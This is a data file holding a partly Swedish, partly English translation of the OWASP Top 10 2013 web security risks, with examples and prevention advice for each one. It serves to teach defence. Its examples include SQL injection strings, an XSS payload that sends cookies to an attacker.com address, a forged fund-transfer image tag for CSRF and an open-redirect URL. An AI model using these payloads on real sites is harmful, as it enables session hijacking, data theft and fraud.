
"O","Om OWASP",
"I","Introduktion",
"Release Notes","RN",
"Application Security Risks","Risk",
"OWASP Topp 10 Applikations- säkerhetsrisker – 2013 ","T10",
"ExempelScenario #1: Applikationen använder opålitlig data i uppbyggnaden följande sårbara SQL-anrop:  String query = "SELECT * FROM accounts WHERE  custID='" + request.getParameter("id") + "'";Scenario #2: Liknande, en applikation som blint litar på ett ramverk kan resultera i frågor som fortfarande är sårbara (t.ex., Hibernate Query Language (HQL)):  Query HQLQuery = session.createQuery(“FROM accounts  WHERE custID='“ + request.getParameter("id") + "'");I båda fallen modifierar en attackerare värdet för ‘id’ parametern till:  ' or '1'='1. Till exempel: http://example.com/app/accountView?id=' or '1'='1 Detta ändrar innebörden för båda frågorna till att returnera alla rader från acccounts-tabellen. Ännu farligare attacker kan modifiera data eller anropa stored procedures.","Är jag sårbar mot injektion?Det bästa sättet att avgöra ifall en applikation är sårbar för injektion är att verifiera att all användning av interpreterare tydligt separerar opålitlig data från kommandot eller frågan. För SQL innebär detta att binda alla variabler i prepared statements och stored procedures och undvika dynamiska frågor.Att kontrollera koden är en snabb och säker sätt att kolla ifall applikationen använder interpretorer säkert. Verktyg för kodanalys kan hjälpa granskare att hitta var, när och hur en intepretator används i applikationen. Penetrationstestare kan validera these issues genom att utnyttja sårbarheten.Dynamiska scanningar kan ge insikt i huruvida några sårbarheter existerar. Scannare kan inte alltid nå interpretatorn och har ofta svårigheter att avgöra när en attack var lyckad. Dålig felhantering gör injektionsbrister lätta att upptäcka.","ReferenserOWASP OWASP SQL Injection Prevention Cheat Sheet OWASP Query Parameterization Cheat Sheet OWASP Command Injection Article OWASP XML eXternal Entity (XXE) Reference Article ASVS: Output Encoding/Escaping Requirements (V6) OWASP Testing Guide: Chapter on SQL Injection TestingExterna CWE Entry 77 on Command Injection CWE Entry 89 on SQL Injection CWE Entry 564 on Hibernate Injection","Hur motverkar jag injektion?För att motverka injektion krävs det att opålitlig data och kommandon/frågor separeras.The preferred option är att använda ett säkert API vilket undviker att använda en interpreterare helt eller genom ett parameterserad gränssnitt. Var försiktig med API:r, t.ex. stored procedure, som är parameterisad men kan fortfarande introducera injektion “under huven”.Ifall ett parameterisat API inte är tillgängligt bör du noga escape specialtecken enligt den interpretatorns escape-syntax. OWASPs ESAPI tillhandhåller många av dessa escaping rutiner.Positiv eller “vitlistad” indatavalidering är också att rekommendera, men det är inte en fullgod försvar då många applikationer kräver specialtecken i dess indata. Ifall specialtecken krävs måste alternativ 1 eller 2 appliceras. OWASPs ESAPI har ett utbyggbart bibliotek av rutiner för vitlist-validering. ","A1","Injektion",
"ExempelScenario #1: Ett flygbokningssystem stödjer omskrivning av URL:n och lagrar sessions-ID:n I URL:n:  http://example.com/sale/saleitems;jsessionid=  2P0OC2JSNDLPSKHCJUN2JV?dest=HawaiiEn autentiserad användare vill meddela sina vänner om flyget och e-postar länken till sina vänner. När vännerna besöker länken så kommer de använda hens session och kreditkort.Scenario #2: Applikationens time-out är inte satt korrekt. En användare använder en publik dator för att logga in på en sida. Istället för att välja att logga ut så stänger användaren ner webbläsaren och går iväg. En attackerare använder samma dator efteråt och webbläsaren är fortfarande autentiserad.Scenario #3: Interna eller externa attackerare får tillgång till systemets användardatabas. Lösenorden är inte korrekt hashade och exponerar alla användarnas lösenord för attackeraren.","Är jag sårbar mot kapning?Är uppgifter för sessionshantering (t.ex. inloggningsuppgifter och sessions-ID) tillräckligt skyddade? Du kan vara sårbar ifall:Inloggningsuppgifter är inte lagrade skyddade, såsom krypterade eller hashade. Se A6.Credentials kan skrivas över eller gissas p.g.a. bristfällig kontohantering (t.ex. när konto skapas, byta eller återställa lösenord, svaga sessions-ID).Sessions-ID exponeras i URL (t.ex., URL rewriting).Sessions-ID är sårbar mot sessionsfixering-attacker.Sessions-ID timar inte ut, eller sessionsbiljetter (i synnerhet single-sign on biljetter) ogiltigförklaras inte korrekt vid utloggning.Sessions-ID roteras inter efter lyckad inloggning.Lösenord, sessions-ID och andra credentials skickas i klartext. Se A6.Se ASVS krav area V2 och V3 för mer detaljer.","ReferenserOWASPFör en mer uttömmande lista med krav och problem att undvika, se ASVS krav om autentisering (V2) och sessionshantering (V3). OWASP Authentication Cheat Sheet OWASP Forgot Password Cheat Sheet OWASP Session Management Cheat Sheet OWASP Development Guide: Kapitel om autentisering OWASP Testing Guide: Kapitel om autentiseringExterna CWE Entry 287 on Improper Authentication CWE Entry 384 on Session Fixation","Hur motverkar jag detta?De huvudsakliga rekommendationerna för en organisation är att göra följande tillgänliga för utvecklarna:En enda uppsättning säkrad funtionalitet för autentisering och sessionshantering. Dessa  funktionalitet bör sträva emot:möta alla krav på autentisering och sessionshantering definierade i OWASPs Application Security Verification Standard (ASVS) area V2 (Authentication) och V3 (Session Management).ha ett enkelt gränssnitt för utvecklare. Överväg exemplen i ESAPI Authenticator and User APIs som bra exempel för emulering, användning och struktur.Stor ansträngning bör läggas på att undvika XSS-sårbheter för att undvika att sessions-ID stjäls. Se A3.","A2","Bristfällig autentisering och sessionshantering",
"ExempelApplikationen använder opålitlig data i uppbyggnaden av följande HTML-kod utan validering eller escaping:  (String) page += "<input name='creditcard' type='TEXT‘  value='" + request.getParameter("CC") + "'>";Attackeraren modifierar CC-parametern i webbläsaren till:  '><script>document.location=  'http://www.attacker.com/cgi-bin/cookie.cgi?  foo='+document.cookie</script>'Detta gör att offrets kakor skickas till attackeraren, vilket möjlighet för attackeraren att överta offrets session.Notera att attackeraren även kan använda XSS för att kringgå eventuella skydd mot CSRF som applikationen har implementerat. Se A8 för mer information om CSRF.","Är jag sårbar mot XSS?Du är såbar ifall du inte säkerställer att all användargenererad data är korrekt validerad eller escapad innan datan inkluderas i resultatet. Utan korrekt validering eller escaping kommer den datan hanteras som riktigt innehåll i sidan och exekveras.Ifall AJAX används för att dynamiskt uppdatera sidan, kontrollera att ni använder säkra JavaScript API:er. För osäkra JavaScript API:er måste encoding och validering användas.Automatiska verktyg kan hitta några XSS sårbarheter automatiskt. Dock så bygger varje applikation sidorna olika och använder olika klient-tekniker (såsom JavaScript, ActiveX, Flash, Silverlight m.m.) vilket försvårar automatisk detektion. För ett komplett skydd krävs kodgenomgång och penetrationstestning som komplement till automatiska verktyg. Web 2.0-tekniker, såsom AJAX, försvårar detektion genom automatiska verktyg.","ReferenserOWASP OWASP XSS Prevention Cheat Sheet OWASP DOM based XSS Prevention Cheat Sheet OWASP Cross-Site Scripting Article  ESAPI Encoder API ASVS: Output Encoding/Escaping Requirements (V6) OWASP AntiSamy: Sanitization Library Testing Guide: Första två kapitlen om indatavalidering OWASP Code Review Guide: Kapitel om XSS OWASP XSS Filter Evasion Cheat SheetExterna CWE Entry 79 om Cross-Site Scripting","Hur motverkar jag XSS?För att förebygga XSS krävs det att opålitlig data separeras från faktiskt webbinnehåll.Det rekommenderade sättet är att korrekt koda om all opålitlig data beroende på i vilken HTML-kontext (body, attribut, JavaScript, CSS, URL etc.) data kommer att placeras. Se OWASP XSS Prevention Cheat Sheet för mer information om omkodning.Vit-listning av tillåten indata är också en rekommendation, men är inte ett fullgott skydd då många applikationer kräver specialtecken i dess indata. Sådan validering bör validera längden, tecken, format och affärsregler på indatan innan den accepteras.För avancerat innehåll överväg att tvätta innehållet med t.ex. OWASP’s AntiSamy eller Java HTML Sanitizer Project.Överväg Content Security Policy (CSP) för att skydda hela sidan mot XSS.","A3","Cross-Site Scripting (XSS)",
"ExempelApplikationen använder icke-verifierad indata i en SQL-fråga som hämtar ut kontoinformation;  String query = "SELECT * FROM accts WHERE account = ?";  PreparedStatement pstmt =  connection.prepareStatement(query , … );  pstmt.setString( 1, request.getParameter("acct"));  ResultSet results = pstmt.executeQuery( );Attackeraren byter helt enkelt ut acct-paramentern i hens webbläsare att skicka vilken användare-id som helst. Om det inte verifieras korrekt så kan attackeraren komma åt vilken kontoinformation som helst, istället för den tänkta användarens information.   http://example.com/app/accountInfo?acct=notmyacct","Är jag sårbar?Det bästa sättet att avgöra ifall en applikation är sårbar för osäkra direktreferenser är att verifiera att alla objekt-referenser har lämpliga säkerhetsfunktioner.För direkta referenser till skyddade resurser, verifierar applikationen korrekt användarens rättigheter till den begärda resursen?För indirekta referenser, gör kopplingen till den direkta referensen att applikationen inte korrekt verifierar användarens rättigheter till den begärda resursen?Kodgranskning av applikationen kan visa snabbt om vald strategi är korrekt implementerad. Testning är också effektivt för att identifiera direktreferenser och ifall de är säkra. Automatiska verktyg letar normalt inte efter sådana brister eftersom de inte känner till vilka resurser som anses som skyddade resurser eller vad som är säkert eller osäkert.","ReferenserOWASP OWASP Top 10-2007 om Insecure Dir Object References ESAPI Access Reference Map API ESAPI Access Control API (Se isAuthorizedForData(), isAuthorizedForFile(), isAuthorizedForFunction() )För ytterligare information om behörighetskrav, se ASVS requirements area for Access Control (V4).Externa CWE Entry 639 om Insecure Direct Object References CWE Entry 22 om Path Traversal (ett exampel på Direct Object Reference attack)","Hur motverkar jag detta?Att motverka osäkra direktreferenser innebär att välja en strategi för att skydda varje användartillgänglig resurs (t.ex. resrus-id, filnamn osv.):Använda indirekta referenser per användare eller session. Detta motverkar att en attackerare kan direkt referera en obehörig resurs. T.ex. istället för att använda resursens databas-nyckel kan en drop-down meny med användarens sex resurser användas där numrena 1 till 6 används för att härleda till en resurs. Applikationen måste härleda en per användare indirekt referens tillbaka till den faktiska referensen. OWASP’s ESAPI inkluderar både en sekventiell och slumpmässig reference maps som utvecklare kan användare för att ta bort behovet av direkta referenser. Åtkomstkontroll. Varje resursbegäran från en opålitlig källa måste även inkludera en åtkomstkontroll för att verifiera att användaren har behörigheter till resursen.","Osäkra direktreferenser","A4",
"ExempelScenario #1: The app server admin console is automatically installed and not removed. Default accounts aren’t changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.Scenario #2: Directory listing is not disabled on your server. Attacker discovers she can simply list directories to find any file. Attacker finds and downloads all your compiled Java classes, which she decompiles and reverse engineers to get all your custom code. She then finds a serious access control flaw in your application.Scenario #3: App server configuration allows stack traces to be returned to users, potentially exposing underlying flaws. Attackers love the extra information error messages provide.Scenario #4: App server comes with sample applications that are not removed from your production server. Said sample applications have well known security flaws attackers can use to compromise your server.","Är jag sårbar mot attack?Is your application missing the proper security hardening across any part of the application stack? Including:Is any of your software out of date? This includes the OS, Web/App Server, DBMS, applications, and all code libraries (see new A9).Are any unnecessary features enabled or installed (e.g., ports, services, pages, accounts, privileges)?Are default accounts and their passwords still enabled and unchanged?Does your error handling reveal stack traces or other overly informative error messages to users?Are the security settings in your development frameworks (e.g., Struts, Spring, ASP.NET) and libraries not set to secure values?Without a concerted, repeatable application security configuration process, systems are at a higher risk.","ReferenserOWASP OWASP Development Guide: Kapitel om konfiguration OWASP Code Review Guide: Kapitel om felhantering OWASP Testing Guide: Configuration Management OWASP Testing Guide: Testning för felkoder OWASP Top 10 2004 - Insecure Configuration Management För ytterligare krav i denna area, se ASVS krav om säkerhetskonfiguration (V12).Externa PC Magazine artikel om webbserver härdning CWE Entry 2 om Environmental Security Flaws CIS Security Configuration Guides/Benchmarks","Hur motverkar jag detta?The primary recommendations are to establish all of the following:A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down. Development, QA, and production environments should all be configured identically (with different passwords used in each environment). This process should be automated to minimize the effort required to setup a new secure environment.A process for keeping abreast of and deploying all new software updates and patches in a timely manner to each deployed environment. This needs to include all code libraries as well (see new A9).A strong application architecture that provides effective, secure separation between components.Consider running scans and doing audits periodically to help detect future misconfigurations or missing patches.","Felaktig säkerhetskonfiguration","A5",
"ExempelScenario #1: An application encrypts credit card numbers in a database using automatic database encryption. However, this means it also decrypts this data automatically when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. The system should have encrypted the credit card numbers using a public key, and only allowed back-end applications to decrypt them with the private key.Scenario #2: A site simply doesn’t use SSL for all authenticated pages. Attacker simply monitors network traffic (like an open wireless network), and steals the user’s session cookie. Attacker then replays this cookie and hijacks the user’s session, accessing the user’s private data.Scenario #3: The password database uses unsalted hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password file. All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.","Am I Vulnerable to Data Exposure?The first thing you have to determine is which data is sensitive enough to require extra protection. For example, passwords, credit card numbers, health records, and personal information should be protected. For all such data:Is any of this data stored in clear text long term, including backups of this data?Is any of this data transmitted in clear text, internally or externally? Internet traffic is especially dangerous.Are any old / weak cryptographic algorithms used?Are weak crypto keys generated, or is proper key management or rotation missing?Are any browser security directives or headers missing when sensitive data is provided by / sent to the browser?And more … For a more complete set of problems to avoid, see ASVS areas Crypto (V7), Data Prot. (V9), and SSL (V10).","ReferenserOWASP - For a more complete set of requirements, see ASVS req’ts on Cryptography (V7), Data Protection (V9)  and  Communications Security (V10) OWASP Cryptographic Storage Cheat Sheet OWASP Password Storage Cheat Sheet OWASP Transport Layer Protection Cheat Sheet OWASP Testing Guide: Chapter on SSL/TLS TestingExterna CWE Entry 310 on Cryptographic Issues CWE Entry 312 on Cleartext Storage of Sensitive Information CWE Entry 319 on Cleartext Transmission of Sensitive Information CWE Entry 326 on Weak Encryption","How Do I Prevent This?The full perils of unsafe cryptography, SSL usage, and data protection are well beyond the scope of the Top 10. That said, for all sensitive data, do all of the following, at a minimum:Considering the threats you plan to protect this data from (e.g., insider attack, external user), make sure you encrypt all sensitive data at rest and in transit in a manner that defends against these threats.Don’t store sensitive data unnecessarily. Discard it as soon as possible. Data you don’t have can’t be stolen.Ensure strong standard algorithms and strong keys are used, and proper key management is in place. Consider using FIPS 140 validated cryptographic modules.Ensure passwords are stored with an algorithm specifically designed for password protection, such as bcrypt, PBKDF2, or scrypt.Disable autocomplete on forms collecting sensitive data and disable caching for pages that contain sensitive data.","Sensitive Data Exposure","A6",
"ExempelScenario #1: The attacker simply force browses to target URLs. The following URLs require authentication. Admin rights are also required for access to the “admin_getappInfo” page.  http://example.com/app/getappInfo  http://example.com/app/admin_getappInfoIf an unauthenticated user can  access either page, that’s a flaw. If an authenticated, non-admin, user is allowed to access the “admin_getappInfo” page, this is also a flaw, and may lead the attacker to more improperly protected admin pages.Scenario #2: A page provides an ‘action ‘parameter to specify the function being invoked, and different actions require different roles. If these roles aren’t enforced, that’s a flaw.","Am I Vulnerable to Forced Access?The best way to find out if an application has failed to properly restrict function level access is to verify every application function:Does the UI show navigation to unauthorized functions?Are  server side authentication or authorization checks missing?Are server side checks done that solely rely on information provided by the attacker?Using a proxy, browse your application with a privileged role. Then revisit restricted pages using a less privileged role. If the server responses are alike, you're probably vulnerable. Some testing proxies directly support this type of analysis.You can also check the access control implementation in the code. Try following a single privileged request through the code and verifying the authorization pattern. Then search the codebase to find where that pattern is not being followed.Automated tools are unlikely to find these problems.","ReferenserOWASP OWASP Top 10-2007 on Failure to Restrict URL Access ESAPI Access Control API OWASP Development Guide: Chapter on Authorization OWASP Testing Guide: Testing for Path Traversal OWASP Article on Forced BrowsingFor additional access control requirements, see the ASVS requirements area for Access Control (V4).Externa CWE Entry 285 on Improper Access Control (Authorization)","How Do I Prevent Forced Access?Your application should have a consistent and easy to analyze authorization module that is invoked from all of your business functions.  Frequently, such protection is provided by one or more components external to the application code. Think about the process for managing entitlements and ensure you can update and audit easily. Don’t hard code.The enforcement mechanism(s) should deny all access by default, requiring explicit grants to specific roles for access to every function.If the function is involved in a workflow, check to make sure the conditions are in the proper state to allow access.NOTE: Most web applications don’t display links and buttons to unauthorized functions, but this “presentation layer access control” doesn’t actually provide protection. You must also implement checks in the controller or business logic.","Missing Function Level Access Control","A7",
"ExempelThe application allows a user to submit a state changing request that does not include anything secret. For example:  http://example.com/app/transferFunds?amount=1500  &destinationAccount=4673243243So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control:  <img src="http://example.com/app/transferFunds?  amount=1500&destinationAccount=attackersAcct#“  width="0" height="0" />If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.","Am I Vulnerable to CSRF?To check whether an application is vulnerable, see if any links and forms lack an unpredictable CSRF token. Without such a token, attackers can forge malicious requests.  An alternate defense is to require the user to prove they intended to submit the request, either through reauthentication, or some other proof they are a real user (e.g., a CAPTCHA).Focus on the links and forms that invoke state-changing functions, since those are the most important CSRF targets.You should check multistep transactions, as they are not inherently immune. Attackers can easily forge a series of requests by using multiple tags or possibly JavaScript.Note that session cookies, source IP addresses, and other information automatically sent by the browser don’t provide any defense against CSRF since this information is also included in forged requests.OWASP’s CSRF Tester tool can help generate test cases to demonstrate the dangers of CSRF flaws.","ReferenserOWASP OWASP CSRF Article OWASP CSRF Prevention Cheat Sheet OWASP CSRFGuard - CSRF Defense Tool  ESAPI Project Home Page  ESAPI HTTPUtilities Class with AntiCSRF Tokens OWASP Testing Guide: Chapter on CSRF Testing OWASP CSRFTester - CSRF Testing Tool Externa CWE Entry 352 on CSRF ","How Do I Prevent CSRF?Preventing CSRF usually requires the inclusion of an unpredictable token in each HTTP request. Such tokens should, at a minimum, be unique per user session.The preferred option is to include the unique token in a hidden field. This causes the value to be sent in the body of the HTTP request, avoiding its inclusion in the URL, which is more prone to exposure.The unique token can also be included in the URL itself, or a URL parameter. However, such placement runs a greater risk that the URL will be exposed to an attacker, thus compromising the secret token.OWASP’s CSRF Guard can automatically include such tokens in Java EE, .NET, or PHP apps. OWASP’s ESAPI includes methods developers can use to prevent CSRF vulnerabilities.Requiring the user to reauthenticate, or prove they are a user (e.g., via a CAPTCHA) can also protect against CSRF.","Cross-Site Request Forgery(CSRF)","A8",
"ExempelComponent vulnerabilities can cause almost any type of risk imaginable, ranging from the trivial to sophisticated malware designed to target a specific organization. Components almost always run with the full privilege of the application, so flaws in any component can be serious, The following two vulnerable components were downloaded 22m times in 2011.Apache CXF Authentication Bypass – By failing to provide an identity token, attackers could invoke any web service with full permission. (Apache CXF is a services framework, not to be confused with the Apache Application Server.)Spring Remote Code Execution – Abuse of the Expression Language implementation in Spring allowed attackers to execute arbitrary code, effectively taking over the server.Every application using either of these vulnerable libraries is vulnerable to attack as both of these components are directly accessible by application users. Other vulnerable libraries, used deeper in an application, may be harder to exploit.","Am I Vulnerable to Known Vulns?In theory, it ought to be easy to figure out if you are currently using any vulnerable components or libraries. Unfortunately, vulnerability reports for commercial or open source software do not always specify exactly which versions of a component are vulnerable in a standard, searchable way. Further, not all libraries use an understandable version numbering system. Worst of all, not all vulnerabilities are reported to a central clearinghouse that is easy to search, although sites like CVE and NVD are becoming easier to search.Determining if you are vulnerable requires searching these databases, as well as keeping abreast of project mailing lists and announcements for anything that might be a vulnerability. If one of your components does have a vulnerability, you should carefully evaluate whether you are actually vulnerable by checking to see if your code uses the part of the component with the vulnerability and whether the flaw could result in an impact you care about.","ReferenserOWASP OWASP Dependency Check (for Java libraries) OWASP SafeNuGet (for .NET libraries thru NuGet) Good Component Practices ProjectExterna The Unfortunate Reality of Insecure Libraries Open Source Software Security Addressing Security Concerns in Open Source Components MITRE Common Vulnerabilities and Exposures Example Mass Assignment Vulnerability that was fixed in ActiveRecord, a Ruby on Rails GEM","How Do I Prevent This?One option is not to use components that you didn’t write. But that’s not very realistic.Most component projects do not create vulnerability patches for old versions. Instead, most simply fix the problem in the next version. So upgrading to these new versions is critical. Software projects should have a process in place to:Identify all components and the versions you are using, including all dependencies. (e.g., the versions plugin).Monitor the security of these components in public databases, project mailing lists, and security mailing lists, and keep them up to date.Establish security policies governing component use, such as requiring certain software development practices, passing security tests, and acceptable licenses. Where appropriate, consider adding security wrappers around components to disable unused functionality and/ or secure weak or vulnerable aspects of the component.","Using Components with Known Vulnerabilities","A9",
"ExempelScenario #1: The application has a page called “redirect.jsp” which takes a single parameter named “url”. The attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware.  http://www.example.com/redirect.jsp?url=evil.com Scenario #2: The application uses forwards to route requests between different parts of the site. To facilitate this, some pages use a parameter to indicate where the user should be sent if a transaction is successful. In this case, the attacker crafts a URL that will pass the application’s access control check and then forwards the attacker to administrative functionality for which the attacker isn’t authorized.  http://www.example.com/boring.jsp?fwd=admin.jsp","Am I Vulnerable to Redirection?The best way to find out if an application has any unvalidated redirects or forwards is to:Review the code for all uses of redirect or forward (called a transfer in .NET). For each use, identify if the target URL is included in any parameter values. If so, if the target URL isn’t validated against a whitelist, you are vulnerable.Also, spider the site to see if it generates any redirects (HTTP response codes 300-307, typically 302). Look at the parameters supplied prior to the redirect to see if they appear to be a target URL or a piece of such a URL. If so, change the URL target and observe whether the site redirects to the new target.If code is unavailable, check all parameters to see if they look like part of a redirect or forward URL destination and test those that do.","ReferenserOWASP OWASP Article on Open Redirects  ESAPI SecurityWrapperResponse sendRedirect() methodExterna CWE Entry 601 on Open Redirects  WASC Article on URL Redirector Abuse Google blog article on the dangers of open redirects OWASP Top 10 for .NET article on Unvalidated Redirects and Forwards","How Do I Prevent This?Safe use of redirects and forwards can be done in a number of ways:Simply avoid using redirects and forwards.If used, don’t involve user parameters in calculating the destination. This can usually be done.If destination parameters can’t be avoided, ensure that the supplied value is valid, and authorized for the user.	It is recommended that any such destination parameters be a mapping value, rather than the actual URL or portion of the URL, and that server side code translate this mapping to the target URL.	Applications can use ESAPI to override the sendRedirect() method to make sure all redirect destinations are safe.Avoiding such flaws is extremely important as they are a favorite target of phishers trying to gain the user’s trust.","Unvalidated Redirects and Forwards","A10",
"Nästa step för utvecklare","+D",
"Nästa steg för granskare","+V",
"Nästa steg för organisationer","+O",
"+R","2","Note About Risks",
"Details About Risk Factors","+F","Förekomst","Upptäckbarhet","Exploaterbarhet","Påverkan",

